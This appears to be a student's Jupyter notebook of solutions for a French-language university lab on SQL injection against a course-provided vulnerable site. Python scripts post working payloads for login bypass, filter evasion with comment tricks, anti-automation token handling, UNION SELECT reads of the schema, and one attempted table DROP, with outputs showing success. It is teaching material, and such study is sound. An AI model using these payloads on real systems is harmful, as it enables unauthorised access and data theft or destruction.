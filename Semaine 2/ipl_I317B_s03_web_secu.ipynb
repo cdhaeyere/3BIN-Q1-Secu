{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 2 : Vulnérabilitées web - Injection SQL (1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1a:\n",
    "Pour ce premier exercice, nous vous demandons de passer le formulaire de connexion codé par un mauvais développeur : http://labosecuipl.alwaysdata.net/23/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1a/\",\n",
    "    data={  #TODO\n",
    "        \"login\": '\" or 1=1;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    "\n",
    ")\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login=\" \" OR 1=1;-- AND password=\" \""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1b:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex1b/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1b/\",\n",
    "    data={\n",
    "        \"login\": ' \\' or 1=1;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login=' ' OR 1=1;-- AND password=' '"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex2/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex2/\",\n",
    "    data={\n",
    "        \"login\": \"') or 1=1;--\",\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE ( login=' ' ) or 1=1;-- AND `password`=' ')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3:\n",
    "Dans cette nouvelle version, le développeur semble avoir prit conscience que certains caractères ne devraient pas être accepté ... mais vous êtes plus malin que lui, n'est-ce pas ?\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex3/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex3/\",\n",
    "    data={\n",
    "        \"login\": '\"/**/or/**/true;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4:\n",
    "\n",
    "Une variante du précédant formulaire a été mit en place, il semblerait que notre mauvais dev veuille cette fois-ci empêcher les requêtes automatisées.\n",
    "Encore une fois, trouvez le moyen de vous y connecter : http://labosecuipl.alwaysdata.net/23/s02/ex4/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "session = requests.session()\n",
    "\n",
    "headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'}\n",
    "\n",
    "page_form = session.get('http://labosecuipl.alwaysdata.net/23/s02/ex4/');\n",
    "\n",
    "soup = BeautifulSoup(page_form.text)\n",
    "token = soup.find('input', {\"type\": \"hidden\"})['value']\n",
    "\n",
    "page = session.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex4/\",\n",
    "    data={\n",
    "        \"login\": \"'/**/or/**/true;--\",\n",
    "        \"password\": \"\",\n",
    "        \"token\": token\n",
    "    },\n",
    "    headers=headers\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 5:\n",
    "Un espion sur place m'a confirmé que, ne parvenant pas à circonvenir nos injections, le dévelopeur derrière ce site à juste décidé de vider la base de donnée `users`. Il s'est venté bruyament de sa nouvelle idée à coté de la machine à café :\n",
    "\n",
    "> \"J'ai vidé la base de donnée ! Haha ! La requête sql de connexion ne peut plus renvoyé de login utilisateur donc impossible pour eux de se connecter ! Haha, ces maudits hackers ne m'auront pas cette fois-ci !\".\n",
    "\n",
    "Désormait, toutes les requêtes, même injectée \"toujours vraie\" sont vide ... C'est embêtant mais je suis sûr qu'on peut arranger le coup !\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex5/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex5/\",\n",
    "    data={\n",
    "        \"login\": \"' UNION SELECT 'a', 'b' ;--\",\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6a:\n",
    "Pour ce nouvel exercice, nous allons utiliser un nouveau formulaire. Ce formulaire nous permet de chercher parmi les éléments du tableau périodique des éléments. Par exemple, si vous cherchez \"Co*\", vous obtiendrez les informations sur le copper (cuivre) et le cobalt.\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex6/\n",
    "\n",
    "Commencez par récupérer le numéro de version de notre base de donnée. Ici, nous connaissons le type de base de donnée : SQLITE, un petit détour par la documentation nous permet deconnaître la fonction parfait pour cela : https://www.sqlite.org/lang_corefunc.html#sqlite_version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<style type=\"text/css\">\n",
      "table, th, td {\n",
      "   border: 1px solid black;\n",
      "}\n",
      "</style>\n",
      "<body>\n",
      "<form action='.' method='GET'>\n",
      "  Name:<br>\n",
      "  <input type='text' name='name'><br>\n",
      "  <input type='submit' value='Submit'>\n",
      "</form>\n",
      "\n",
      "<h2>Request for name : \"'UNION SELECT sqlite_version(), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a';--\"</h2><table>\n",
      "        <tr><th>name</th><th>symbol</th><th>atomic_number</th><th>atomic_weight</th><th>density</th><th>melting_point</th><th>boiling_point</th><th>atomic_radius</th><th>covalent_radius</th><th>ionic_radius</th><th>specific_volume</th><th>specific_heat</th><th>heat_fusion</th><th>heat_evaporation</th><th>thermal_conductivity</th><th>pauling_electronegativity</th><th>first_ionisation_energy</th><th>oxidation_states</th><th>electronic_configuration</th><th>lattice</th><th>lattice_constant</th></tr><tr>    <td>3.27.2</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr></table></body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "    params={\n",
    "        \"name\": \"'UNION SELECT sqlite_version(), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a';--\",\n",
    "    }\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <... 21 elements> FROM <TABLE> WHERE name LIKE '' UNION SELECT sqlite_version(), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a';--';"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6b:\n",
    "Dans le même ordre d’idée, je vous invite à récupérer la liste des tables présentes dans cette base de donnée.\n",
    "\n",
    "Comme souvent, la lecture de la documentation peut vous faciliter la vie : https://www.sqlite.org/faq.html#q7\n",
    "\n",
    "<sup><sub>(Et comme bien souvent ... la vrai vie c'est compliqué : https://www.sqlite.org/schematab.html#alternative_names )</sub></sup>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<style type=\"text/css\">\n",
      "table, th, td {\n",
      "   border: 1px solid black;\n",
      "}\n",
      "</style>\n",
      "<body>\n",
      "<form action='.' method='GET'>\n",
      "  Name:<br>\n",
      "  <input type='text' name='name'><br>\n",
      "  <input type='submit' value='Submit'>\n",
      "</form>\n",
      "\n",
      "<h2>Request for name : \"'UNION SELECT name, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' FROM sqlite_master WHERE type='table';--\"</h2><table>\n",
      "        <tr><th>name</th><th>symbol</th><th>atomic_number</th><th>atomic_weight</th><th>density</th><th>melting_point</th><th>boiling_point</th><th>atomic_radius</th><th>covalent_radius</th><th>ionic_radius</th><th>specific_volume</th><th>specific_heat</th><th>heat_fusion</th><th>heat_evaporation</th><th>thermal_conductivity</th><th>pauling_electronegativity</th><th>first_ionisation_energy</th><th>oxidation_states</th><th>electronic_configuration</th><th>lattice</th><th>lattice_constant</th></tr><tr>    <td>elements</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr><tr>    <td>gemstones</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr><tr>    <td>planets</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr></table></body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "    params={\n",
    "        \"name\": \"'UNION SELECT name, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' FROM sqlite_master WHERE type='table';--\",\n",
    "    }\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6c (bonus):\n",
    "Maintenant que vous connaissez toutes les tables dans cette base de données ainsi que le nom de chaque champ, pourquoi ne pas récupérer le contenu de chacune de ces tables ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<style type=\"text/css\">\n",
      "table, th, td {\n",
      "   border: 1px solid black;\n",
      "}\n",
      "</style>\n",
      "<body>\n",
      "<form action='.' method='GET'>\n",
      "  Name:<br>\n",
      "  <input type='text' name='name'><br>\n",
      "  <input type='submit' value='Submit'>\n",
      "</form>\n",
      "\n",
      "<h2>Request for name : \"'UNION DROP planets, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' ;--\"</h2><br />\n",
      "<b>Fatal error</b>:  Uncaught Error: Call to a member function execute() on boolean in /home/labosecuipl/www/23/s02/ex6/index.php:23\n",
      "Stack trace:\n",
      "#0 {main}\n",
      "  thrown in <b>/home/labosecuipl/www/23/s02/ex6/index.php</b> on line <b>23</b><br />\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "\n",
    "page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "    params={\n",
    "        \"name\": \"'UNION DROP planets, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' ;--\",\n",
    "    }\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
